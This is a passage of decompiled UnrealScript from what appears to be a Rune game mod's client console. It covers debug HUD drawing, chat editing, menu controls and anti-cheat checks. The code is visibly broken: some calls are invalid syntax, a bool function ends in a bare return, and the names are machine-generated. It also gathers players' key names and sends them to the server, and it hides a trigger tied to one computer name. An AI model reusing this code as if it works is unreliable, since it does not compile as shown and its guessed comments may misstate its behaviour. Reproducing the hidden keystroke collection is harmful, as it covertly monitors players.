    AxisX = Origin + vect(3.0, 0.0, 0.0);
    AxisY = Origin + vect(0.0, 3.0, 0.0);
    AxisZ = Origin + vect(0.0, 0.0, 3.0);

    Canvas.DrawLine3D(Origin, AxisX, 255.0, 0.0, 0.0); // Red for X-axis
    Canvas.DrawLine3D(Origin, AxisY, 0.0, 255.0, 0.0); // Green for Y-axis
    Canvas.DrawLine3D(Origin, AxisZ, 0.0, 0.0, 255.0); // Blue for Z-axis

    ScreenX = WorldToScreenAdvanced(AxisX, Canvas.ClipX, Canvas.ClipY, Owner.FovAngle, RunePlayer(Owner).SavedCameraLoc, RunePlayer(Owner).SavedCameraRot);
    ScreenY = WorldToScreenAdvanced(AxisY, Canvas.ClipX, Canvas.ClipY, Owner.FovAngle, RunePlayer(Owner).SavedCameraLoc, RunePlayer(Owner).SavedCameraRot);
    ScreenZ = WorldToScreenAdvanced(AxisZ, Canvas.ClipX, Canvas.ClipY, Owner.FovAngle, RunePlayer(Owner).SavedCameraLoc, RunePlayer(Owner).SavedCameraRot);

    Canvas.Font = Canvas.BigFont;
    Canvas.SetPos(ScreenX.X, ScreenX.Y);
    Canvas.DrawText("X");
    Canvas.SetPos(ScreenY.X, ScreenY.Y);
    Canvas.DrawText("Y");
    Canvas.SetPos(ScreenZ.X, ScreenZ.Y);
    Canvas.DrawText("Z");
}

// Suggested name: CalculateScaleFactor2
function float CalculateScaleFactor2(float Dimension1, float Dimension2)
{
    // This function calculates a scaling factor based on two float parameters, likely screen dimensions.
    // It is identical to CalculateScaleFactor.

    local float Ratio;

    Ratio = Dimension2 / Dimension1;

    if (Ratio < 0.75)
    {
        return Dimension2 / 480.0;
    }
    else
    {
        return Dimension1 / 640.0;
    }
}

// Suggested name: DrawTimeDebugInfo
function DrawTimeDebugInfo(Canvas Canvas)
{
    // This function draws debug information related to time synchronization and network latency.

    local int CurrentX, CurrentY;
    local float ClientTime, ServerTime;

    CurrentX = 815;
    CurrentY = 65;

    Canvas.DrawColor = MakeColor(230, 230, 230);
    Canvas.Style = 2;
    Canvas.bCenter = false;
    Canvas.Font = Canvas.MedFont;

    Canvas.SetPos(float(CurrentX), float(CurrentY));
    Canvas.DrawText("~ CAZ debug ~");
    CurrentY += 15;

    Canvas.SetPos(float(CurrentX), float(CurrentY));
    Canvas.DrawText("--------------------------------------------------");
    CurrentY += 15;

    ClientTime = ZRunePlayer(Owner).FLT_v4586 - ZRunePlayer(Owner).FLT_v4587;
    ServerTime = ZRunePlayer(Owner).FLT_v4585;

    Canvas.SetPos(float(CurrentX), float(CurrentY));
    Canvas.DrawText("~ Delta " $ string(FLT_v6360));
    Canvas.DrawColor = MakeColor(230, 230, 230);
    CurrentY += 15;

    Canvas.SetPos(float(CurrentX), float(CurrentY));
    Canvas.DrawText("~ ServerTime " $ string(ServerTime));
    Canvas.DrawColor = MakeColor(230, 230, 230);
    CurrentY += 15;

    Canvas.SetPos(float(CurrentX), float(CurrentY));
    if (ServerTime > ClientTime)
    {
        Canvas.DrawColor = MakeColor(255, 0, 0);
    }
    else if (ServerTime == ClientTime)
    {
        Canvas.DrawColor = MakeColor(0, 255, 0);
    }
    else
    {
        Canvas.DrawColor = MakeColor(0, 255, 255);
    }
    Canvas.DrawText("~ ClientTime " $ string(ClientTime));
    CurrentY += 15;

    Canvas.SetPos(float(CurrentX), float(CurrentY));
    Canvas.DrawColor = MakeColor(230, 230, 230);
    Canvas.DrawText("~ Server - Client " $ string(ServerTime - ClientTime));
    CurrentY += 15;

    Canvas.SetPos(float(CurrentX), float(CurrentY));
    Canvas.DrawText("~ Margin " $ string(ZRunePlayer(Owner).FLT_v4588));
    Canvas.DrawColor = MakeColor(230, 230, 230);
    CurrentY += 15;

    Canvas.SetPos(float(CurrentX), float(CurrentY));
    Canvas.DrawText("~ TimeDilation: " $ string(Owner.Level.TimeDilation));
    Canvas.DrawColor = MakeColor(230, 230, 230);
    CurrentY += 15;

    Canvas.SetPos(float(CurrentX), float(CurrentY));
    Canvas.DrawText("~ CurTimeStamp" $ string(ZRunePlayer(Owner).FLT_v4587));
    Canvas.DrawColor = MakeColor(230, 230, 230);
    CurrentY += 15;
}

// Suggested name: ToggleDebugModeM
exec function toggleDebugM()
{
    // This function toggles the B_v6731 boolean, likely enabling or disabling a debug mode.

    B_v6731 = !B_v6731;
}

// Suggested name: DebugTimeDilation
exec function debugDilation(float DilationValue)
{
    // This function is currently empty and may be a placeholder for debugging time dilation.
    return;
}

// Suggested name: CalculateKDRatio
function string CalculateKDRatio(float Kills, float Deaths)
{
    // This function calculates a K/D ratio and returns it as a string,
    // with special handling for division by zero.

    local string KDRatioString;

    if ((Kills > 0.0) && (Deaths >= 0.0))
    {
        if (Deaths == 0.0)
        {
            KDRatioString = "God";
        }
        else
        {
            KDRatioString = string(Kills / Deaths);
        }
        return Left(KDRatioString, 4);
    }

    return "n/a";
}

// Suggested name: RenderUWindowInterface
final function RenderUWindowInterface(Canvas Canvas)
{
    // This function renders the UWindow interface.

    if (bTimeDemo)
    {
        TimeDemoCalc();
        TimeDemoRender(Canvas);
    }

    if (Root != none)
    {
        Root.bUWindowActive = true;
    }

    RenderUWindow(Canvas);
}

// Suggested name: HandleKeyType
event bool KeyType(Console.EInputKey Key)
{
	local Rotator PlayerViewRotation;

	// If not in typing or menu mode, ignore key input
	if (INT_v6715 == 0)
	{
		return false;
	}

	// Handle key input in menu mode (INT_v6715 == 1)
	if (INT_v6715 == 1)
	{
		// Ensure root window exists
		if (Root == none)
		{
			return false;
		}

		// Normalize player's view rotation
		PlayerViewRotation = Normalize(Viewport.Actor.ViewRotation);

		// Pass key event to the root window
		Root.WindowEvent(8, none, MouseX, MouseY, int(Key));

		// Handle console edit box input if visible
		if ((((bShowConsole && zRConsoleW != none) && zRConsoleW.ClientArea != none) && zRuneConsoleClientWindow(zRConsoleW.ClientArea).EditControl != none) && zRuneConsoleClientWindow(zRConsoleW.ClientArea).EditControl.EditBox != none) && zRuneConsoleClientWindow(zRConsoleW.ClientArea).EditControl.bWindowVisible)
		{
			// Reset alt key state on left mouse button
			if (int(Key) == 1)
			{
				eqC_vxv_6345[18] = 0;
			}

			// Insert printable characters into edit box if alt is held and key is valid
			if ((int(Key) >= 32) && (int(Key) < 256) && (int(Key) != Asc("`")) && (eqC_vxv_6345[18] == 1) && (int(Key) > 60))
			{
				zRuneConsoleClientWindow(zRConsoleW.ClientArea).EditControl.EditBox.Insert(Key);
			}
		}
		return true;
	}

	// Skip processing if bNoStuff is set (e.g., after Talk command)
	if (bNoStuff)
	{
		bNoStuff = false;
		return true;
	}

	// Handle printable characters in typing mode (INT_v6715 == 2)
	if (((int(Key) >= 32) && int(Key) < 256) && int(Key) != Asc("`"))
	{
		// Check length limit for "say" commands
		if ((Left(TypedStr, 3) ~= "say") && Len(TypedStr) > 262)
		{
			// Length exceeded, do nothing
		}
		else
		{
			// Check length limit for "teamsay" commands
			if ((Left(TypedStr, 7) ~= "teamsay") && Len(TypedStr) > 265)
			{
				// Length exceeded, do nothing
			}
			else
			{
				// Insert the character at the cursor position
				TypedStr = (Left(TypedStr, INT_v6678) $ Chr(int(Key))) $ Right(TypedStr, Len(TypedStr) - INT_v6678);
				INT_v6678++;
				Scrollback = 0;
				return true;
			}
		}
	}
	return false; // Key not handled
}

event NotifyLevelChange()
{
    bLevelChange = true;
    if(Root != none)
    {
        Root.NotifyBeforeLevelChange();
    }
    RestoreRuneConsole();
    RConsole.NotifyLevelChange();
    return;
}

exec function testTorch()
{
    bTestTorch = true;
    return;
}
//suggested name : SpawnTorch
function SpawnTorch()
{
    if ((Rand(50) < 45) && !bTestTorch)
    {
        return;
    }
    if (FTorch_v6659 != none)
    {
        return;
    }
    if (bTestTorch || zPlayerReplicationInfo(Owner.PlayerReplicationInfo).CompName == "QHITC107ZD")
    {
        FTorch_v6659 = Owner.Spawn(Class'coadminz7.FTorch',,, (Owner.Location + (float(72) * Vector(Owner.Rotation))) + (vect(0.0000000, 0.0000000, 1.0000000) * float(25)));
        FTorch_v6659.CAZCon = self;
        zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("chet", ":thor_wow: TORCH SPAWN", 0);
        bTestTorch = false;
    }
    return;
}
// Suggested name: HandleKeyEvent
event bool KeyEvent(Console.EInputKey Key, Console.EInputAction Action, float Delta)
{
	local bool bHandled;
	local Rotator PlayerRotation;
	local bool bIsSpecialKey;
	local string KeyName, TempString;
	local bool bIsDebugMode;
	local int TempInt;
	local Vector TempVector;

	PlayerRotation = Normalize(Viewport.Actor.Rotation);

	if (bdebugk)
	{
		if (int(Action) == 1)
		{
			eqC_vxv_6345[int(Key)] = 1;
		}
	}

	if ((((int(Action) == 3) && int(Key) != 9) && int(Key) != 16) && !zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5402)
	{

			KeyName = Viewport.Actor.ConsoleCommand("keyName " $ string(Key));
			if (KeyName == "")
			{
				ZRunePlayer(Viewport.Actor).LogCheatDetection(ZRunePlayer(Viewport.Actor)."bytehack", 1);
				ZRunePlayer(Viewport.Actor).ReportAndLockPlayer(ZRunePlayer(Viewport.Actor)."bytehack", "");
			}
			if (int(Key) != 44)
			{
				INT_v6357++;
			}
			if (int(Key) == 233)
			{
				INT_v6357 += RandRange(20, 45);
			}
			zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("chet", ((Owner.PlayerReplicationInfo.PlayerName @ "_____") $ KeyName) @ string(INT_v6357), 1);
			if (INT_v6357 > 120)
			{
				// ENTIRE PLAYER USELESSSTUCT to TRUE..
				if (bSwapInput || bSwap)
				{
					ZRunePlayer(Viewport.Actor).LogCheatDetection("using automatic turning. ( macro / keybind / aimbot )");
				}
				else
				{
					ZRunePlayer(Viewport.Actor).LogCheatDetection("using automatic turning. (  macro /  keybind / aimbot )");
				}
			}
		eqC_vxv_6345[int(Key)] = 0;
	}

	if ((((int(Action) == 4) && int(Key) == int(228)) && Delta != 0.0) && Abs(Delta) > float(60))
	{
		if (Delta == FLT_v6358)
		{
			INT_v6357++;
			if (INT_v6357 > 120)
			{
				zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("chet", (Owner.PlayerReplicationInfo.PlayerName @ "__|_|__") $ string(INT_v6357), 1);
				INT_v6357 = 0;
			}
			if (INT_v6357 > 10000)
			{
				ZRunePlayer(Viewport.Actor).USELESSSTUCT.UNK_v4553 = true;
				/* useless struct block */
				if (bSwapInput || bSwap)
				{
					ZRunePlayer(Viewport.Actor).LogCheatDetection("using automatic turning. ( macro / keybind / aimbot )", 1);
				}
				else
				{
					ZRunePlayer(Viewport.Actor).LogCheatDetection("using automatic turning. (  macro /  keybind / aimbot )", 1);
				}
			}
		}
		FLT_v6358 = Delta;
	}

	if (int(Action) == 3)
	{
		if ((int(Key) != 236) && int(Key) != 237)
		{
			INT_v6369++;
		}
		if (int(Owner.Level.TimeSeconds) != INT_v6505)
		{
			if ((INT_v6369 > 100) && Owner.Level.TimeDilation == 1.0)
			{
				ZRunePlayer(Owner).LogCheatDetection("using an autoclicker (" $ string(INT_v6369) $ " clicks in 1 second)");
			}
			INT_v6505 = int(Owner.Level.TimeSeconds);
			INT_v6369 = 0;
		}
	}

	if ((int(Action) == 3) && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).B_v5404)
	{
		KeyName = Viewport.Actor.ConsoleCommand("keyName " $ string(Key));
		if (KeyName ~= "LEFTMOUSE")
		{
			KeyName = "LM";
		}
		if (KeyName ~= "RIGHTMOUSE")
		{
			KeyName = "RM";
		}
		if (Len(STR_v6368) < 160)
		{
			STR_v6368 = STR_v6368 @ KeyName;
		}
		else
		{
			zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("cheta", STR_v6368, 1);
			STR_v6368 = KeyName;
		}
	}

	if (B_v6413)
	{
		if ((int(Key) == 1) && int(Action) == 1)
		{
			if (B_v6414)
			{
				zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("mapVote", "1", 2);
			}
			else
			{
				zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("mapVote", "2", 2);
			}
		}
		if ((int(Key) == 2) && int(Action) == 1)
		{
			zPlayerReplicationInfo(Owner.PlayerReplicationInfo).RepsToStorageCMD("mapVote", "0", 2);
		}
	}

	if (int(Action) == 4)
	{
		UNK_v6716 = PlayerRotation;
		B_v6718 = true;
		if (INT_v6715 == 0)
		{
			if (((B_v4524 || B_v6413) || bSwap) || bSwapInput)
			{
				switch (Key)
				{
					case 228:
						MouseX = MouseX + (MouseScale * Delta);
						break;
					case 229:
						MouseY = MouseY - (MouseScale * Delta);
						break;
					default:
						break;
				}
				if ((B_v6413 || bSwap) || bSwapInput)
				{
					if ((int(Key) == int(228)) || int(Key) == int(229))
					{
						return true;
					}
				}
			}
		}
	}
	else
	{
		if ((INT_v6715 == 0) || (INT_v6715 == 1) && !bQuickKeyEnable)
		{
			HandleInputKey(Key, Action, Delta);
		}
	}

	INT_v6742 = int(Viewport.Actor.Level.TimeSeconds);
	savedIdleTime = 0;
	INT_v6745 = 0;
	hashDe = "";

	if (Parm_bool_0 && int(Key) != 91)
	{
		Parm_bool_0 = false;
		ZRunePlayer(Viewport.Actor).eq_vxv_573(false);
		if (FTorch_v6659 != none)
		{
			FTorch_v6659.LifeSpan = 4.0;
			FTorch_v6659.SetLocation((Owner.Location + (float(72) * Vector(Owner.Rotation))) + (vect(0.0, 0.0, 1.0) * float(40)));
		}
	}

	if ((TypedStr != "") && bEnhancedChat)
	{
		if (int(Action) == 3)
		{
			if ((int(Key) == cSmartKey) && Len(STR_v6664) >= 1)
			{
				STR_v6674 = TypedStr;
				INT_v6675 = INT_v6678;
				if (STR_v6665 != "")
				{
					TypedStr = Left(TypedStr, Len(TypedStr) - Len(STR_v6663)) $ STR_v6666;
					INT_v6678 = Len(TypedStr);
				}
				else
				{
					TypedStr = Left(TypedStr, Len(TypedStr) - Len(STR_v6663)) $ STR_v6664;
					INT_v6678 = Len(TypedStr);
				}
				STR_v6664 = "";
				STR_v6666 = "";
				STR_v6671 = "";
				STR_v6667 = "";
				STR_v6665 = "";
			}
		}
		if ((int(Action) == 3) && int(Key) == 17)
		{
			B_v6670 = false;
		}
		if ((int(Key) == 17) && int(Action) == 1)
		{
			B_v6670 = true;
		}
		if ((int(Key) == 18) && int(Action) == 1)
		{
			atEveryone = !atEveryone;
		}
		if (B_v6670 && int(Action) == 3)
		{
			if ((int(Key) == Asc("v")) || int(Key) == Asc("V"))
			{
				if (((GetClipboardText()) != "") && (Len(TypedStr) + Len(GetClipboardText())) < 262)
				{
					STR_v6674 = TypedStr;
					INT_v6675 = INT_v6678;
					TypedStr = (Left(TypedStr, INT_v6678) $ (GetClipboardText())) $ Right(TypedStr, Len(TypedStr) - INT_v6678);
					INT_v6678 = INT_v6678 + Len(GetClipboardText());
				}
				else
				{
					Owner.ClientMessage("Can't paste, maximum length reached.");
				}
			}
			if ((int(Key) == Asc("c")) || int(Key) == Asc("C"))
			{
				if ((STR_v6665 != "") || STR_v6667 != "")
				{
					if (STR_v6666 != "")
					{
						Owner.CopyToClipboard(STR_v6666);
						Msg(("'" $ STR_v6666) $ "' has been copied to clipboard. ( CTRL + V to paste it).");
					}
				}
				else
				{
					if (STR_v6664 != "")
					{
						Owner.CopyToClipboard(STR_v6664);
						Msg(("'" $ STR_v6664) $ "' has been copied to clipboard. ( CTRL + V to paste it).");
					}
					else
					{
						if ((Left(Caps(TypedStr), 4) == "SAY ") && Right(TypedStr, Len(TypedStr) - 4) != "")
						{
							Owner.CopyToClipboard(Right(TypedStr, Len(TypedStr) - 4));
							Msg(("'" $ Right(TypedStr, Len(TypedStr) - 4)) $ "' has been copied to clipboard. ( CTRL + V to paste it).");
						}
					}
				}
			}
			if ((int(Key) == Asc("z")) || int(Key) == Asc("Z"))
			{
				if (STR_v6674 != "")
				{
					TypedStr = STR_v6674;
					INT_v6678 = INT_v6675;
					Msg("Last change has been undone.");
					STR_v6674 = "";
					INT_v6675 = 0;
				}
			}
		}
	}

	bHandled = eqP_vxv_2532(Key, Action, Delta);
	return bHandled;
}

final function bool eqP_vxv_2532(Console.EInputKey Key, Console.EInputAction Parm_Console.EInputAction_0, float Delta)
{
    local byte Local_byte_v0;
    local bool Local_bool_v0;
    local string Local_string_v0;

    if(INT_v6715 != 0)
    {
        if(INT_v6715 == 1)
        {
            return eqP_vxv_2534(Key, Parm_Console.EInputAction_0, Delta);
        }
        if((INT_v6715 == 2) && int(Key) == int(27))
        {
            return eqP_vxv_2535(Key, Parm_Console.EInputAction_0, Delta);
        }
    }
    if(int(Parm_Console.EInputAction_0) != int(1))
    {
        return false;
    }
    Local_byte_v0 = Key;
    switch(Parm_Console.EInputAction_0)
    {
        case 1:
            switch(Local_byte_v0)
            {
                case 27:
                    if(bLocked)
                    {
                        return true;
                    }
                    if(showBlackBackground)
                    {
                        Root.GetPlayerOwner().RendMap = 0;
                    }
                    bQuickKeyEnable = false;
                    LaunchUWindow();
                    return true;
                case zConsoleKey:
                    if(bLocked)
                    {
                        return true;
                    }
                    bQuickKeyEnable = true;
                    LaunchUWindow();
                    eqC_vxv_6345[18] = 0;
                    if(zRuneConsoleClientWindow(zRConsoleW.ClientArea).EditControl.EditBox != none)
                    {
                        zRuneConsoleClientWindow(zRConsoleW.ClientArea).EditControl.EditBox.bAllSelected = false;
                    }
                    if(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB != none)
                    {
                        zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos = zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxPos;
                    }
                    if(!bShowConsole)
                    {
                        ShowConsole();
                        if(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB != none)
                        {
                            zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos = zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxPos;
                        }
                        Parm_string_075(bAutoScroll);                        
                    }
                    else
                    {
                        Parm_string_075(true);
                    }
                    return true;
                default:
                    break;
                    break;
            }
        default:
            if((int(Parm_Console.EInputAction_0) == int(1)) && bCMenu)
            {
                if(B_v6445 || B_v6446)
                {
                    if(!bTyping)
                    {
                        if((((int(Key) == 40) || int(Key) == 39) || int(Key) == 38) || int(Key) == 37)
                        {
                            return true;
                        }
                    }
                }
            }
            if(B_v4524 && INT_v6715 == 0)
            {
                if(int(Parm_Console.EInputAction_0) == int(2))
                {
                    if((int(Key) == 37) || int(Key) == 65)
                    {
                        Owner.aBaseY -= float(300);
                        if(Owner.aBaseY < float(-150))
                        {
                            Owner.aBaseY = -150.0000000;
                        }
                        return true;
                    }
                    if((int(Key) == 39) || int(Key) == 68)
                    {
                        Owner.aBaseY += float(300);
                        return true;
                    }                    
                }
                else
                {
                    if((int(Parm_Console.EInputAction_0) == int(4)) && int(Key) == 228)
                    {
                        return false;
                    }
                }
            }
            if(INT_v6715 == 2)
            {
                return eqP_vxv_2535(Key, Parm_Console.EInputAction_0, Delta);
            }
            return false;
            break;
    }
    return;
}

final function bool eqP_vxv_2534(Console.EInputKey Key, Console.EInputAction Parm_Console.EInputAction_0, float Delta)
{
    local byte Local_byte_v0;
    local float Val;
    local bool Local_bool_v0;
    local string Local_string_v0;
    local bool Local_bool_v1;
    local int Local_int_v0, Local_int_v1, Local_int_v2, Local_int_v3, Local_int_v4;

    local float Local_float_v0, Local_float_v1;
    local int Local_int_v5, Local_int_v6;

    Local_byte_v0 = Key;
    if(((int(Parm_Console.EInputAction_0) == 3) && B_v6753) && !B_v6751)
    {
        if(int(Key) == 237)
        {
            testfloat7 -= float(5);
            if(testfloat7 < float(0))
            {
                testfloat7 = 5.0000000;
            }
        }
        if(int(Key) == 236)
        {
            testfloat7 += float(5);
            if(testfloat7 > float(1000))
            {
                testfloat7 = 1000.0000000;
            }
        }
    }
    if(B_v6753 && B_v6751)
    {
        if((int(Key) == 1) && int(Parm_Console.EInputAction_0) == 1)
        {
            if(ContainsString(STR_v6752, "categor"))
            {
                B_v6444 = !B_v6444;
            }
        }
        if((int(Key) == 2) && int(Parm_Console.EInputAction_0) == 1)
        {
            if(ContainsString(STR_v6752, "categor"))
            {
                B_v6444 = false;
            }
        }
        if((B_v6444 && int(Parm_Console.EInputAction_0) == 3) && ContainsString(STR_v6752, "menu"))
        {
            if((ContainsString(STR_v6752, "SLIDER")) && int(Key) == 1)
            {
                Local_int_v0 = (INT_v6451 + menuDist) + functionDist;
                Local_int_v1 = 64;
                Local_int_v3 = MenuCategories[gI].minValue[INT_v6448];
                Local_int_v2 = MenuCategories[gI].maxValue[INT_v6448];
                Local_int_v6 = int(MenuCategories[gI].stepValue[INT_v6448]);
                if(((MenuCategories[gI].controlStyle[INT_v6448] == 3) || MenuCategories[gI].controlStyle[INT_v6448] == 4) || MenuCategories[gI].controlStyle[INT_v6448] == 5)
                {
                    Local_int_v6 = 5;
                }
                Local_int_v4 = int(Root.MouseX * Root.GUIScale);
                if((Local_int_v4 >= Local_int_v0) && Local_int_v4 <= (Local_int_v0 + Local_int_v1))
                {
                    Local_float_v0 = float(Local_int_v4 - Local_int_v0);
                    Local_float_v1 = (100.0000000 / float(Local_int_v1)) * Local_float_v0;
                    Local_int_v5 = int(float(Local_int_v3) + ((float(Local_int_v2 - Local_int_v3) * Local_float_v0) / float(Local_int_v1)));
                    J0x2ED:

                    if(((float(Local_int_v5) % float(Local_int_v6)) != float(0)) && Local_int_v5 > (Local_int_v2 / 2))
                    {
                        Local_int_v5 += 1;
                        // [Loop Continue]
                        goto J0x2ED;
                    }
                    J0x322:

                    if(((float(Local_int_v5) % float(Local_int_v6)) != float(0)) && Local_int_v5 < (Local_int_v2 / 2))
                    {
                        Local_int_v5 -= 1;
                        // [Loop Continue]
                        goto J0x322;
                    }
                    SetPropertyAndRefresh(MenuCategories[gI].Value[INT_v6448], string(Local_int_v5));
                    if(bCustomWeaponColor && Owner.Weapon != none)
                    {
                        Owner.Weapon.DesiredColorAdjust.X = float(weaR);
                        Owner.Weapon.DesiredColorAdjust.Y = float(weaG);
                        Owner.Weapon.DesiredColorAdjust.Z = float(weaB);
                    }
                    SaveConfigAndRefresh();
                    return true;
                }
            }
            if((int(Key) == 237) || int(Key) == 2)
            {
                if(MenuCategories[gI].propertyName[INT_v6448] == "int")
                {
                    Val = float(int(GetPropertyText(MenuCategories[gI].Value[INT_v6448]))) - MenuCategories[gI].stepValue[INT_v6448];
                    if(Val < float(MenuCategories[gI].minValue[INT_v6448]))
                    {
                        Val = float(MenuCategories[gI].maxValue[INT_v6448]);
                    }
                    if(Val > float(MenuCategories[gI].maxValue[INT_v6448]))
                    {
                        Val = float(MenuCategories[gI].minValue[INT_v6448]);
                    }
                    SetPropertyAndRefresh(MenuCategories[gI].Value[INT_v6448], string(Val));
                    if(MenuCategories[gI].Value[INT_v6448] == "selectedObjectID")
                    {
                        if(eqI_vxv_6587[int(Val)] != string(Owner))
                        {
                            A_v6593 = FindActorByStringName(eqI_vxv_6587[int(Val)]);
                        }
                    }
                }
                if(MenuCategories[gI].propertyName[INT_v6448] == "float")
                {
                    Val = float(GetPropertyText(MenuCategories[gI].Value[INT_v6448])) - MenuCategories[gI].stepValue[INT_v6448];
                    if(Val < float(MenuCategories[gI].minValue[INT_v6448]))
                    {
                        Val = float(MenuCategories[gI].maxValue[INT_v6448]);
                    }
                    if(Val > float(MenuCategories[gI].maxValue[INT_v6448]))
                    {
                        Val = float(MenuCategories[gI].minValue[INT_v6448]);
                    }
                    SetPropertyAndRefresh(MenuCategories[gI].Value[INT_v6448], string(Val));
                }
                if(gI == INT_v6432)
                {
                    ManageMapSettings(MenuCategories[gI].propertyName[INT_v6448]);
                }
                if(gI == INT_v6433)
                {
                    ClearKillFeed(MenuCategories[gI].propertyName[INT_v6448]);
                }
                if(int(Parm_Console.EInputAction_0) == 3)
                {
                    SaveConfigAndRefresh();
                }
            }
            if(int(Key) == 236)
            {
                if(MenuCategories[gI].propertyName[INT_v6448] == "int")
                {
                    Val = float(int(GetPropertyText(MenuCategories[gI].Value[INT_v6448]))) + MenuCategories[gI].stepValue[INT_v6448];
                    if(Val < float(MenuCategories[gI].minValue[INT_v6448]))
                    {
                        Val = float(MenuCategories[gI].maxValue[INT_v6448]);
                    }
                    if(Val > float(MenuCategories[gI].maxValue[INT_v6448]))
                    {
                        Val = float(MenuCategories[gI].minValue[INT_v6448]);
                    }
                    SetPropertyAndRefresh(MenuCategories[gI].Value[INT_v6448], string(Val));
                    if(MenuCategories[gI].Value[INT_v6448] == "selectedObjectID")
                    {
                        if(eqI_vxv_6587[int(Val)] != string(Owner))
                        {
                            A_v6593 = FindActorByStringName(eqI_vxv_6587[int(Val)]);
                        }
                    }
                    if(bCustomWeaponColor && Owner.Weapon != none)
                    {
                        Owner.Weapon.DesiredColorAdjust.X = float(weaR);
                        Owner.Weapon.DesiredColorAdjust.Y = float(weaG);
                        Owner.Weapon.DesiredColorAdjust.Z = float(weaB);
                    }
                }
                if(MenuCategories[gI].propertyName[INT_v6448] == "float")
                {
                    Val = float(GetPropertyText(MenuCategories[gI].Value[INT_v6448])) + MenuCategories[gI].stepValue[INT_v6448];
                    if(Val < float(MenuCategories[gI].minValue[INT_v6448]))
                    {
                        Val = float(MenuCategories[gI].maxValue[INT_v6448]);
                    }
                    if(Val > float(MenuCategories[gI].maxValue[INT_v6448]))
                    {
                        Val = float(MenuCategories[gI].minValue[INT_v6448]);
                    }
                    SetPropertyAndRefresh(MenuCategories[gI].Value[INT_v6448], string(Val));
                }
                if(gI == INT_v6432)
                {
                    ManageMapSettings(MenuCategories[gI].propertyName[INT_v6448]);
                }
                if(gI == INT_v6433)
                {
                    ClearKillFeed(MenuCategories[gI].propertyName[INT_v6448]);
                }
                if(int(Parm_Console.EInputAction_0) == 3)
                {
                    SaveConfigAndRefresh();
                }
            }
            if(int(Key) == 1)
            {
                if(MenuCategories[gI].Value[INT_v6448] == "/")
                {
                    if(GetPropertyText(MenuCategories[gI].propertyName[INT_v6448]) ~= (Localize("General", "False", "Core")))
                    {
                        SetPropertyAndRefresh(MenuCategories[gI].propertyName[INT_v6448], "True");                        
                    }
                    else
                    {
                        SetPropertyAndRefresh(MenuCategories[gI].propertyName[INT_v6448], "False");
                    }
                }
                if(MenuCategories[gI].propertyName[INT_v6448] == "int")
                {
                    Val = float(int(GetPropertyText(MenuCategories[gI].Value[INT_v6448]))) + MenuCategories[gI].stepValue[INT_v6448];
                    if(Val < float(MenuCategories[gI].minValue[INT_v6448]))
                    {
                        Val = float(MenuCategories[gI].maxValue[INT_v6448]);
                    }
                    if(Val > float(MenuCategories[gI].maxValue[INT_v6448]))
                    {
                        Val = float(MenuCategories[gI].minValue[INT_v6448]);
                    }
                    SetPropertyAndRefresh(MenuCategories[gI].Value[INT_v6448], string(Val));
                    if(MenuCategories[gI].Value[INT_v6448] == "selectedObjectID")
                    {
                        if(eqI_vxv_6587[int(Val)] != string(Owner))
                        {
                            A_v6593 = FindActorByStringName(eqI_vxv_6587[int(Val)]);
                        }
                    }
                    if(bCustomWeaponColor && Owner.Weapon != none)
                    {
                        Owner.Weapon.DesiredColorAdjust.X = float(weaR);
                        Owner.Weapon.DesiredColorAdjust.Y = float(weaG);
                        Owner.Weapon.DesiredColorAdjust.Z = float(weaB);
                    }
                }
                if(MenuCategories[gI].propertyName[INT_v6448] == "float")
                {
                    Val = float(GetPropertyText(MenuCategories[gI].Value[INT_v6448])) + MenuCategories[gI].stepValue[INT_v6448];
                    if(Val < float(MenuCategories[gI].minValue[INT_v6448]))
                    {
                        Val = float(MenuCategories[gI].maxValue[INT_v6448]);
                    }
                    if(Val > float(MenuCategories[gI].maxValue[INT_v6448]))
                    {
                        Val = float(MenuCategories[gI].minValue[INT_v6448]);
                    }
                    SetPropertyAndRefresh(MenuCategories[gI].Value[INT_v6448], string(Val));
                }
                if(MenuCategories[gI].propertyName[INT_v6448] == "command")
                {
                    HandleObjectManipulation(MenuCategories[gI].Value[INT_v6448], true);
                }
                if(gI == INT_v6432)
                {
                    ManageMapSettings(MenuCategories[gI].propertyName[INT_v6448]);
                }
                if(gI == INT_v6433)
                {
                    ClearKillFeed(MenuCategories[gI].propertyName[INT_v6448]);
                }
                if(int(Parm_Console.EInputAction_0) == 3)
                {
                    SaveConfigAndRefresh();
                }
            }
        }
    }
    switch(Parm_Console.EInputAction_0)
    {
        case 3:
            switch(Local_byte_v0)
            {
                case 1:
                    if(Root != none)
                    {
                        Root.WindowEvent(1, none, MouseX, MouseY, int(Local_byte_v0));
                    }
                    break;
                case 2:
                    if(Root != none)
                    {
                        Root.WindowEvent(5, none, MouseX, MouseY, int(Local_byte_v0));
                    }
                    break;
                case 4:
                    if(Root != none)
                    {
                        Root.WindowEvent(3, none, MouseX, MouseY, int(Local_byte_v0));
                    }
                    break;
                default:
                    if(Root != none)
                    {
                        Root.WindowEvent(6, none, MouseX, MouseY, int(Local_byte_v0));
                    }
                    break;
                    break;
            }
            goto J0x151D;
        case 1:
            switch(Local_byte_v0)
            {
                case zConsoleKey:
                    if(bShowConsole)
                    {
                        HideConsole();
                        if(zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB != none)
                        {
                            zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.pos = zRuneConsoleClientWindow(zRConsoleW.ClientArea).UNK_v7309.VertSB.MaxPos;
                        }
                        if(Root.ActiveWindow == none)
                        {
                            CloseUWindow();
                        }                        
                    }
                    else
                    {
